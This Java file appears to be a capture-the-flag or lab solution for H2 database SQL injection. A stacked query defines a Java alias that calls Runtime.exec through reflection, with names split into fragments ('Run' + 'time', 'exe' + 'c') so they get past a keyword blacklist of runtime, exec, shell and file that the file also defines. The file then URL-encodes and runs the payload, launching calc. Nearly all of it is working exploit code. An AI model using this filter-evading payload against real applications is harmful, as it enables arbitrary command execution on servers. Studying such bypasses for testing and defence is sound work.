package solution;

import org.apache.tomcat.util.buf.HexUtils;
import org.h2.jdbcx.JdbcDataSource;

import java.net.URLEncoder;
import java.sql.Connection;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.HashSet;
import java.util.Iterator;

public class Test01 {
    public static void main(String[] args) throws SQLException {
        JdbcDataSource jdbcDataSource = new JdbcDataSource();
        jdbcDataSource.setUrl("jdbc:h2:mem:testdb;DB_CLOSE_DELAY=-1");
        Connection connection = jdbcDataSource.getConnection();
        Statement statement = connection.createStatement();
        statement.executeQuery("select 1;--#");
        String sql = "select 1;CREATE ALIAS RT AS " +
                "$$ void rt(String cmd) throws java.lang.Exception {java.lang.Class<?> run = java.lang.Class.forName(\"java.lang.Run\" + \"time\");java.lang.reflect.Method getr = run.getMethod(\"getRun\"+\"time\");java.lang.reflect.Method ex = run.getMethod(\"exe\" + \"c\", String.class);ex.invoke(getr.invoke(null), \"calc\");}$$;" +
                "CALL RT(\"calc\");";
        String encode = URLEncoder.encode(sql);
        System.out.println(encode);
        if (check(sql)){
            System.out.println("1111111");
            statement.executeQuery(sql);
        }else {
            System.out.println("2222222");
        }

    }


    private static final HashSet<String> blackLists = new HashSet<>();

    static {
        blackLists.add("runtime");
        blackLists.add("process");
        blackLists.add("exec");
        blackLists.add("shell");
        blackLists.add("file");
        blackLists.add("script");
        blackLists.add("groovy");
    }

    public static boolean check(String sql) {
        Iterator<String> it = blackLists.iterator();
        while (it.hasNext()) {
            String keyword = it.next();
            if (sql.toLowerCase().contains(keyword)) {
                return false;
            }
        }
        return true;
    }
}
